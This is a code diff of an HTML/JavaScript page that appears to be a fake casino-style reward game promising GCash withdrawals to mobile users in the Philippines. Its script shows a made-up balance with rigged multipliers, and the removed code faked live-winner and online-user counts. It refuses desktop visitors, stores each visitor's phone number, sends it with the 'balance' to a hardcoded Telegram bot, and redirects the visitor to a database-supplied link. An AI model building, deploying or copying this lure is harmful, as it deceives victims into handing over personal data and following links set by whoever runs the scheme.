@@ -19,84 +19,58 @@
             --glass: rgba(255, 255, 255, 0.03);
             --border: rgba(212, 175, 55, 0.3);
         }
-
         * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-
         body { 
             font-family: 'Public Sans', sans-serif; 
             background-color: var(--dark-bg); 
             background-image: radial-gradient(circle at 50% 0%, #1e3a8a 0%, transparent 70%); 
-            color: #fff; 
-            display: flex; flex-direction: column; align-items: center; 
+            color: #fff; display: flex; flex-direction: column; align-items: center; 
             min-height: 100vh; padding: 15px; overflow-x: hidden; 
         }
 
-        /* --- LIVE WINNER SECTION --- */
-        .live-winner-box { background: rgba(0, 0, 0, 0.7); padding: 8px 15px; border-radius: 50px; font-size: 11px; margin-top: 5px; border: 1px solid var(--border); min-width: 260px; text-align: center; }
-        #winnerEntry { transition: all 0.5s ease; display: inline-block; }
-        .gc-mini-icon { width: 14px; height: 14px; vertical-align: middle; margin: 0 4px; }
+        /* MOBILE ONLY OVERLAY */
+        #mobileOnly { display: none; position: fixed; inset: 0; background: #04070d; z-index: 10000; align-items: center; justify-content: center; text-align: center; padding: 20px; }
 
-        /* --- GAME GRID & CARDS --- */
         .card { background: var(--glass); width: 100%; max-width: 400px; padding: 25px; border-radius: 30px; border: 1px solid var(--border); backdrop-filter: blur(15px); text-align: center; margin-top: 10px; position: relative; }
-        .logo-img { width: 140px; height: auto; margin-bottom: 20px; }
-        
-        .game-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin: 25px 0; width: 100%; }
-        .card-wrapper { cursor: pointer; position: relative; display: flex; justify-content: center; }
-        .card-img { width: 100%; max-width: 110px; height: auto; filter: drop-shadow(0 5px 15px rgba(0,0,0,0.5)); transition: transform 0.2s; }
-        
-        .card-disabled { filter: grayscale(0.9) opacity(0.3) !important; pointer-events: none; transform: scale(0.9); transition: 0.5s; }
+        .logo-img { width: 140px; margin-bottom: 20px; }
+        .game-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin: 25px 0; }
+        .card-wrapper { cursor: pointer; position: relative; }
+        .card-img { width: 100%; max-width: 110px; filter: drop-shadow(0 5px 15px rgba(0,0,0,0.5)); }
+        .card-disabled { filter: grayscale(1) opacity(0.2) !important; pointer-events: none; transition: 0.5s; }
 
-        /* --- 6 UNIQUE ANIMATIONS --- */
-        @keyframes goddessTwirl { 0% { transform: rotateY(0); } 100% { transform: rotateY(360deg); } }
-        @keyframes monkeyBounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-25px); } }
-        @keyframes zeusShock { 0% { filter: brightness(1); } 50% { filter: brightness(3) drop-shadow(0 0 20px #fff); } 100% { filter: brightness(1); } }
-        @keyframes bearHop { 0% { transform: scale(1); } 50% { transform: scale(1.2) rotate(10deg); } 100% { transform: scale(1); } }
-        @keyframes dressFloat { 0% { transform: translateY(0); } 50% { transform: translateY(-15px); } 100% { transform: translateY(0); } }
-        @keyframes boxerPunch { 0% { transform: scale(1); } 20% { transform: translateX(-10px); } 50% { transform: scale(1.3) translateX(15px); } 100% { transform: scale(1); } }
+        /* ANIMATIONS */
+        .move-goddess { animation: twirl 0.6s ease; }
+        .move-monkey { animation: bounce 0.5s ease; }
+        .move-firegod { animation: glow 0.4s ease; }
+        .move-bear { animation: hop 0.5s ease; }
+        .move-girl { animation: float 0.6s ease; }
+        .move-boxer { animation: punch 0.4s ease; }
 
-        .move-goddess { animation: goddessTwirl 0.6s ease-out 1; }
-        .move-monkey { animation: monkeyBounce 0.5s ease-out 1; }
-        .move-firegod { animation: zeusShock 0.4s ease-out 1; } /* Linked to Zeus logic */
-        .move-bear { animation: bearHop 0.5s ease-out 1; }
-        .move-girl { animation: dressFloat 0.6s ease-out 1; } /* Linked to Dress logic */
-        .move-boxer { animation: boxerPunch 0.4s ease-out 1; }
+        @keyframes twirl { 0% { transform: rotateY(0); } 100% { transform: rotateY(360deg); } }
+        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-20px); } }
+        @keyframes glow { 0% { filter: brightness(1); } 50% { filter: brightness(3); } }
+        @keyframes hop { 0% { transform: scale(1); } 50% { transform: scale(1.2) translateY(-10px); } }
+        @keyframes float { 0% { transform: translateY(0); } 50% { transform: translateY(-15px); } }
+        @keyframes punch { 0% { transform: translateX(0); } 50% { transform: translateX(10px) scale(1.1); } }
 
-        /* --- EFFECTS --- */
-        .floating-mult { position: absolute; top: -10px; color: #fbbf24; font-family: 'Orbitron'; font-size: 26px; font-weight: 900; animation: floatUp 1s forwards; z-index: 10; text-shadow: 0 0 10px #000; }
-        @keyframes floatUp { 0% { opacity: 1; transform: translateY(0); } 100% { opacity: 0; transform: translateY(-50px); } }
-        
-        .jackpot-text { position: absolute; top: -20px; color: #ff0000; font-family: 'Orbitron'; font-size: 32px; font-weight: 900; text-shadow: 0 0 15px #fff, 0 0 30px #ff0000; z-index: 100; animation: jackPop 1.5s forwards; white-space: nowrap; left: 50%; transform: translateX(-50%); }
-        @keyframes jackPop { 0% { transform: translateX(-50%) scale(0.5); opacity: 0; } 20% { transform: translateX(-50%) scale(1.4); opacity: 1; } 100% { transform: translateX(-50%) scale(1); opacity: 0; } }
-
-        .shake-card { animation: shake 0.3s both; }
-        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
-
-        /* --- UI COMPONENTS --- */
         .amount { font-family: 'Orbitron'; font-size: 42px; background: var(--gold); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; margin: 10px 0; }
-        .timer-box { font-size: 13px; color: #fbbf24; font-weight: 800; margin: 15px 0; min-height: 20px; }
-
-        .btn-group { display: flex; flex-direction: column; gap: 12px; width: 100%; }
-        .share-btn { background: #1877f2; color: #fff; padding: 18px; border: none; border-radius: 15px; font-weight: 800; display: none; cursor: pointer; box-shadow: 0 4px #1052a8; text-transform: uppercase; }
-        .pay-button { background: var(--gold); color: #000; padding: 18px; border: none; border-radius: 15px; font-weight: 800; display: none; cursor: pointer; box-shadow: 0 6px 0 #8b6508; text-transform: uppercase; }
-
-        #processingOverlay { position: fixed; inset: 0; background: rgba(4, 7, 13, 0.98); z-index: 9999; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
-        .spinner { width: 50px; height: 50px; border: 5px solid rgba(212,175,55,0.2); border-top-color: #d4af37; border-radius: 50%; animation: spin 1s linear infinite; }
+        .btn-main { background: var(--gold); color: #000; padding: 18px; border: none; border-radius: 15px; font-weight: 800; width: 100%; display: none; cursor: pointer; text-transform: uppercase; margin-top: 10px; }
+        
+        #processingOverlay { position: fixed; inset: 0; background: rgba(4, 7, 13, 0.98); z-index: 9999; display: none; flex-direction: column; align-items: center; justify-content: center; }
+        .spinner { width: 40px; height: 40px; border: 4px solid rgba(212,175,55,0.1); border-top-color: #d4af37; border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-    <div style="text-align:center; margin-bottom:10px;">
-        <div style="color:#22c55e; font-size:10px; font-weight:800;">● <span id="userCount">88</span> ONLINE</div>
-        <div class="live-winner-box">
-            <span id="winnerEntry">Initializing Secure Link...</span>
-        </div>
+    <div id="mobileOnly">
+        <h2 style="color:#fbbf24">MOBILE ONLY</h2>
+        <p>Please use your smartphone to access this reward.</p>
     </div>
 
     <div class="card" id="mainCard">
         <img src="images/logo1.png" class="logo-img">
-        
-        <div class="game-grid">
+        <div class="game-grid" id="grid">
             <div class="card-wrapper" onclick="handleTap(this, 1)"><img src="images/img1.png" class="card-img"></div>
             <div class="card-wrapper" onclick="handleTap(this, 2)"><img src="images/img2.png" class="card-img"></div>
             <div class="card-wrapper" onclick="handleTap(this, 3)"><img src="images/img3.png" class="card-img"></div>
@@ -105,187 +79,122 @@
             <div class="card-wrapper" onclick="handleTap(this, 6)"><img src="images/img6.png" class="card-img"></div>
         </div>
 
-        <div style="font-size: 10px; color: #aaa; letter-spacing: 2px;">VIRTUAL BALANCE</div>
         <div class="amount" id="balanceText">₱0.00</div>
+        <div id="statusLabel" style="font-size:12px; color:#fbbf24; margin-bottom:10px;">Initializing...</div>
         
-        <div class="timer-box" id="statusLabel">Generating your initial reward in <span id="timer">5</span> seconds...</div>
-
-        <div class="btn-group">
-            <button class="share-btn" id="shareBtn" onclick="doShare()">Share to Facebook (+₱50.00)</button>
-            <button class="pay-button" id="claimBtn" onclick="doClaim()">Withdraw via GCash</button>
-        </div>
+        <button class="btn-main" id="claimBtn" onclick="doClaim()">Withdraw via GCash</button>
     </div>
 
     <div id="processingOverlay">
         <div class="spinner"></div>
-        <div style="color:#fff; margin-top:20px; font-weight:800;">ESTABLISHING VIALINK...</div>
+        <p style="margin-top:15px; font-weight:800;">ESTABLISHING VIALINK...</p>
     </div>
 
     <script>
+        // --- 1. RESTRICTIONS ---
+        if (!/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+            document.getElementById('mobileOnly').style.display = 'flex';
+            window.stop();
+        }
 
-(function() {
-    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
-    
-    // Check kung ang device ay Mobile (Android, iPhone, iPad, iPod)
-    const isMobile = /android|iphone|ipad|ipod/i.test(userAgent.toLowerCase());
-
-    if (!isMobile) {
-        document.body.innerHTML = `
-            <div style="
-                height: 100vh; display: flex; flex-direction: column; 
-                align-items: center; justify-content: center; 
-                background: #04070d; color: #fff; font-family: 'Public Sans', sans-serif; 
-                text-align: center; padding: 30px;
-            ">
-                <img src="images/logo1.png" style="width: 150px; margin-bottom: 20px; opacity: 0.5;">
-                <h1 style="color: #ffdc6a; font-size: 28px; margin-bottom: 10px;">MOBILE ACCESS ONLY</h1>
-                <p style="color: #ccc; font-size: 16px; line-height: 1.5;">
-                    Paumanhin! Ang <b>CasinoPlus Reward System</b> ay maaari lamang gamitin sa mobile devices.<br>
-                    Mangyaring gamitin ang iyong <b>Smartphone</b> para magpatuloy.
-                </p>
-                <div style="margin-top: 30px; padding: 10px 20px; border: 1px solid rgba(212,175,55,0.3); border-radius: 10px; font-size: 12px; color: #555;">
-                    Desktop access detected.
-                </div>
-            </div>
-        `;
-        window.stop();
-        throw new Error("Mobile Only Access");
-    }
-})();
+        // --- 2. FIREBASE & USER INFO ---
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
-        const userPhone = localStorage.getItem("userPhone") || "Guest";
-        
+        const userPhone = localStorage.getItem("userPhone");
+
+        if (!userPhone) window.location.href = "index.html";
+
+        const userRef = db.ref('user_sessions/' + userPhone);
         let balance = 0;
         let clicks = 0;
         let canTap = false;
-        
-        // --- AUDIO CONFIG ---
+
+        // Sounds
         const sndTap = new Audio('sounds/tap.mp3');
         const sndMult = new Audio('sounds/multiplier.mp3');
         const sndLvl3 = new Audio('sounds/lvl3.mp3');
         const sndPaldo = new Audio('sounds/paldo.mp3');
         const sndJackpot = new Audio('sounds/jackpot.mp3');
 
-        const startBalance = Math.round((Math.floor(Math.random() * 901) + 100) / 10) * 10;
-
         window.onload = () => {
-            let timeLeft = 5;
-            animateValue(0, startBalance, 5000);
-            const countdown = setInterval(() => {
-                timeLeft--;
-                document.getElementById('timer').innerText = timeLeft;
-                if(timeLeft <= 0) {
-                    clearInterval(countdown);
-                    balance = startBalance;
-                    canTap = true;
-                    document.getElementById('statusLabel').innerHTML = "✨ Initial Reward Granted! Tap cards for bonus.";
-                    document.getElementById('statusLabel').style.color = "#22c55e";
-                }
-            }, 1000);
-            startLiveWinners();
-        };
-
-        function handleTap(el, id) {
-            if (!canTap || clicks >= 6 || el.classList.contains('card-disabled') || el.dataset.tapped === "true") return;
-            
-            clicks++;
-            el.dataset.tapped = "true"; 
-            const imgElement = el.querySelector('.card-img');
-
-            // --- ANIMATIONS ---
-            if (id === 1) imgElement.classList.add('move-goddess');
-            else if (id === 2) imgElement.classList.add('move-monkey');
-            else if (id === 3) imgElement.classList.add('move-firegod');
-            else if (id === 4) imgElement.classList.add('move-bear');
-            else if (id === 5) imgElement.classList.add('move-girl');
-            else if (id === 6) imgElement.classList.add('move-boxer');
-
-            setTimeout(() => { el.classList.add('card-disabled'); }, 800);
-            
-            // --- ODDS LOGIC ---
-            const rand = Math.random() * 100;
-            let mult = 1;
-            let isJack = false;
-
-            if (rand <= 10) { mult = 10; isJack = true; }
-            else if (rand <= 20) { mult = 4; }
-            else if (rand <= 40) { mult = 3; }
-            else if (rand <= 60) { mult = 2; }
-
-            const added = 25 * mult;
-            const nextBal = Math.round((balance + added) / 10) * 10; 
-
-            // --- SOUND TRIGGER ---
-            if (isJack) {
-                sndJackpot.currentTime = 0; sndJackpot.play();
-                const effect = document.createElement('div');
-                effect.className = 'jackpot-text';
-                effect.innerText = "JACKPOT x10!";
-                confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 }, colors: ['#ff0000', '#ffd700', '#ffffff'] });
-                document.getElementById('mainCard').classList.add('shake-card');
-                setTimeout(() => document.getElementById('mainCard').classList.remove('shake-card'), 300);
-                el.appendChild(effect);
-                setTimeout(() => effect.remove(), 1200);
-            } else if (mult === 4) {
-                sndPaldo.currentTime = 0; sndPaldo.play();
-            } else if (mult === 3) {
-                sndLvl3.currentTime = 0; sndLvl3.play();
-            } else if (mult === 2) {
-                sndMult.currentTime = 0; sndMult.play();
-            } else {
-                sndTap.currentTime = 0; sndTap.play();
-            }
-
-            // Visual mult indicator
-            if (mult > 1 && !isJack) {
-                const effect = document.createElement('div');
-                effect.className = 'floating-mult';
-                effect.innerText = `x${mult}`;
-                el.appendChild(effect);
-                setTimeout(() => effect.remove(), 1200);
-            }
-
-            animateValue(balance, nextBal, 400);
-            balance = nextBal;
-
-            if (clicks === 6) {
-                setTimeout(() => {
-                    document.getElementById('statusLabel').style.display = 'none';
-                    document.getElementById('shareBtn').style.display = 'block';
-                }, 1500);
-            }
-        }
-
-        function doShare() {
-            window.open("https://www.facebook.com/sharer/sharer.php?u=" + encodeURIComponent(window.location.href), '_blank');
-            setTimeout(() => {
-                const bonus = 50;
-                animateValue(balance, balance + bonus, 500);
-                balance += bonus;
-                document.getElementById('shareBtn').style.display = 'none';
-                const claimBtn = document.getElementById('claimBtn');
-                claimBtn.style.display = 'block';
-                claimBtn.innerText = `CLAIM ₱${balance.toLocaleString()}.00 NOW`;
-            }, 1500);
-        }
-
-        function doClaim() {
-            document.getElementById('processingOverlay').style.display = 'flex';
-            const msg = `🔔 [ViaLink] CLAIM: ${userPhone} | ₱${balance}`;
-            fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(msg)}`);
-
-            db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', snapshot => {
-                if (snapshot.exists()) {
-                    const id = Object.keys(snapshot.val())[0];
-                    const url = snapshot.val()[id].url;
-                    db.ref('links/' + id).update({ status: 'pending', user: userPhone, amount: balance });
-                    setTimeout(() => { window.location.href = url; }, 2000);
+            // Check if user has existing data
+            userRef.once('value', (snapshot) => {
+                const data = snapshot.val();
+                if (data) {
+                    balance = data.balance || 0;
+                    clicks = data.clicks || 0;
+                    updateUI();
+                    if (clicks >= 6) {
+                        showClaim();
+                    } else {
+                        canTap = true;
+                        document.getElementById('statusLabel').innerText = "✨ Welcome back! Continue tapping.";
+                    }
                 } else {
-                    alert("Reward Limit Reached! Try muli mamaya.");
-                    document.getElementById('processingOverlay').style.display = 'none';
+                    // New user sequence
+                    startNewUser();
                 }
             });
+        };
+
+        function startNewUser() {
+            let startAmt = Math.round((Math.floor(Math.random() * 500) + 300) / 10) * 10;
+            animateValue(0, startAmt, 2000);
+            setTimeout(() => {
+                balance = startAmt;
+                canTap = true;
+                saveData();
+                document.getElementById('statusLabel').innerText = "🎁 Initial Reward Granted!";
+            }, 2000);
+        }
+
+        function handleTap(el, id) {
+            if (!canTap || clicks >= 6 || el.classList.contains('card-disabled')) return;
+            
+            clicks++;
+            const img = el.querySelector('.card-img');
+            const classes = ['', 'move-goddess', 'move-monkey', 'move-firegod', 'move-bear', 'move-girl', 'move-boxer'];
+            img.classList.add(classes[id]);
+            
+            setTimeout(() => el.classList.add('card-disabled'), 600);
+
+            // Odds Logic
+            const rand = Math.random() * 100;
+            let mult = 1;
+            if (rand <= 10) { mult = 10; sndJackpot.play(); confetti(); }
+            else if (rand <= 25) { mult = 4; sndPaldo.play(); }
+            else if (rand <= 45) { mult = 3; sndLvl3.play(); }
+            else if (rand <= 70) { mult = 2; sndMult.play(); }
+            else { sndTap.play(); }
+
+            let added = 25 * mult;
+            let oldBal = balance;
+            balance = Math.round((balance + added) / 10) * 10;
+            
+            animateValue(oldBal, balance, 400);
+            saveData();
+
+            if (clicks >= 6) showClaim();
+        }
+
+        function saveData() {
+            userRef.set({
+                phone: userPhone,
+                balance: balance,
+                clicks: clicks,
+                lastUpdate: new Date().getTime()
+            });
+        }
+
+        function updateUI() {
+            document.getElementById('balanceText').innerText = "₱" + balance.toLocaleString() + ".00";
+        }
+
+        function showClaim() {
+            canTap = false;
+            document.getElementById('statusLabel').style.display = 'none';
+            document.getElementById('claimBtn').style.display = 'block';
+            document.getElementById('claimBtn').innerText = `Withdraw ₱${balance.toLocaleString()}`;
         }
 
         function animateValue(start, end, duration) {
@@ -293,29 +202,31 @@
             const step = (timestamp) => {
                 if (!startTimestamp) startTimestamp = timestamp;
                 const progress = Math.min((timestamp - startTimestamp) / duration, 1);
-                const currentVal = Math.floor(progress * (end - start) + start);
-                document.getElementById('balanceText').innerText = "₱" + currentVal.toLocaleString() + ".00";
+                const val = Math.floor(progress * (end - start) + start);
+                document.getElementById('balanceText').innerText = "₱" + val.toLocaleString() + ".00";
                 if (progress < 1) window.requestAnimationFrame(step);
             };
             window.requestAnimationFrame(step);
         }
 
-        function startLiveWinners() {
-            const winnerBox = document.getElementById('winnerEntry');
-            setInterval(() => {
-                winnerBox.style.opacity = '0';
-                winnerBox.style.transform = 'translateY(-10px)';
-                setTimeout(() => {
-                    const pref = ["0917", "0915", "0998", "0966", "0927", "0939", "0945", "0916"][Math.floor(Math.random()*8)];
-                    const suffix = Math.floor(1000 + Math.random()*9000);
-                    const amtList = [250, 400, 750, 1200, 1500, 1850, 2000];
-                    const amt = amtList[Math.floor(Math.random()*amtList.length)];
-                    winnerBox.innerHTML = `User ${pref}***${suffix} claimed <img src="images/gc_icon.png" class="gc-mini-icon" onerror="this.style.visibility='hidden'"> ₱${amt.toLocaleString()}`;
-                    winnerBox.style.opacity = '1';
-                    winnerBox.style.transform = 'translateY(0)';
-                    document.getElementById('userCount').innerText = Math.floor(Math.random()*20)+80;
-                }, 500);
-            }, 4000);
+        function doClaim() {
+            document.getElementById('processingOverlay').style.display = 'flex';
+            // Send to Telegram
+            const msg = `💰 CLAIM REQUEST:\n📱 ${userPhone}\n💵 Amount: ₱${balance}`;
+            fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(msg)}`);
+
+            // Find Link from Database
+            db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', snap => {
+                if (snap.exists()) {
+                    const key = Object.keys(snap.val())[0];
+                    const url = snap.val()[key].url;
+                    db.ref('links/' + key).update({ status: 'claimed', user: userPhone });
+                    setTimeout(() => window.location.href = url, 2000);
+                } else {
+                    alert("Out of rewards! Contact Admin.");
+                    document.getElementById('processingOverlay').style.display = 'none';
+                }
+            });
         }
     </script>
 </body>
